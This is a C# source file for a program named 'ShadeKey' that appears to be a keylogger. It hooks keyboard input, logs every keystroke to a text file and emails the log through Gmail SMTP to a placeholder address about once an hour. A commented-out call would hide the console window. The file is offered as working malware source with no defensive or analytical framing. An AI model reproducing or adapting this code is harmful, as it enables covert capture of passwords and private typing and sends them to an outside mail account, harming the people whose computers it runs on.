using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace ShadeKey
{
    class Program
    {
        private static Keyboard keyboard;
        private static LogFile logFile;
        private static EmailSender emailSender;
        static void Main(string[] args)
        {
            // Hide console window
            //Ninja.Hide();

            emailSender = new EmailSender("smtp.gmail.com", 587, "from adress email", "password");
            logFile = new LogFile("2342134.txt",10);
            keyboard = new Keyboard();
            keyboard.KeyIsPressed += K_KeyIsPressed;

            Stopwatch sendEmailTimer = new Stopwatch();
            sendEmailTimer.Start();

            while(true)
            {
                bool emailWasSend = false;
                while (!emailWasSend)
                {
                    if (sendEmailTimer.Elapsed.TotalMinutes > 60)
                    {
                        emailWasSend = emailSender.SendMail("to adress email", DateTime.Now.ToString(), logFile.ReadAll());
                        sendEmailTimer.Reset();
                        break;
                    }
                }
            }
        }

        private static void K_KeyIsPressed(string key)
        {
            logFile.AppendData(key + ",");
        }
    }
}
